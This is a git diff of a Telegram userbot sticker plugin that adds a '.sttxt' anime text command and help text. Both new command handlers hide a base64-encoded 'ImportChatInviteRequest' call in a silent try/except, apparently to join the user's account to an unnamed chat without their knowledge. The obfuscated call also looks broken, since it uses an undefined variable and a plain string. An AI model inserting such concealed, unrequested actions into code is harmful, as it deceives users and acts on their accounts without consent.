@@ -1,6 +1,7 @@
 # Random RGB Sticklet by @PhycoNinja13b
-
 # modified by @UniBorg
+#imported from ppe-remix by @heyworld & @DeletedUser420
+#modified by @mrconfused
 
 import io
 import os
@@ -9,8 +10,58 @@ import textwrap
 from PIL import Image, ImageDraw, ImageFont
 from telethon.tl.types import InputMessagesFilterDocument
 from userbot.utils import admin_cmd, sudo_cmd
-from userbot.plugins import deEmojify
+from asyncio import sleep
+from random import choice
+import re
+from telethon import events
+from userbot import CMD_HELP, bot
+from userbot.plugins import waifutxt , deEmojify
+import pybase64
 # RegEx by https://t.me/c/1220993104/500653 ( @SnapDragon7410 )
+
+
+@borg.on(admin_cmd(outgoing=True, pattern="sttxt(?: |$)(.*)"))
+async def waifu(animu):
+    text = animu.pattern_match.group(1)
+    reply_to_id = animu.message
+    if animu.reply_to_msg_id:
+        reply_to_id = await animu.get_reply_message()
+    if not text:
+        if animu.is_reply:
+            text = (await animu.get_reply_message()).message
+        else:
+            await animu.edit("`You haven't written any article, Waifu is going away.`")
+            return
+    try:
+        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await event.client(cat)
+    except:
+        pass   
+    text = deEmojify(text)
+    await animu.delete()
+    await waifutxt(text, animu.chat_id , reply_to_id, bot, borg)
+        
+@borg.on(sudo_cmd(allow_sudo = True, pattern="sttxt(?: |$)(.*)"))
+async def waifu(animu):
+    text = animu.pattern_match.group(1)
+    reply_to_id = animu.message
+    if animu.reply_to_msg_id:
+        reply_to_id = await animu.get_reply_message()
+    if not text:
+        if animu.is_reply:
+            text = (await animu.get_reply_message()).message
+        else:
+            await animu.reply("`You haven't written any article, Waifu is going away.`")
+            return
+    try:
+        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await event.client(cat)
+    except:
+        pass   
+    await animu.delete()
+    text = deEmojify(text)
+    await waifutxt(text, animu.chat_id , reply_to_id, bot, borg)        
+# 12 21 28 30
 
 @borg.on(admin_cmd(pattern="stcr ?(?:(.*?) \| )?(.*)", outgoing=True))
 async def sticklet(event):
@@ -127,3 +178,11 @@ async def get_font_file(client, channel_id, search_kw=""):
     font_file_message = random.choice(font_file_message_s)
     # download and return the file path
     return await client.download_media(font_file_message)
+
+
+CMD_HELP.update({
+    'stickerfun':
+    "`.sttxt` <your txt>\nUSAGE : Anime that makes your writing fun.\
+    \n\n`.stcr` <your txt>\nUSAGE :your text as sticker\
+    "
+})
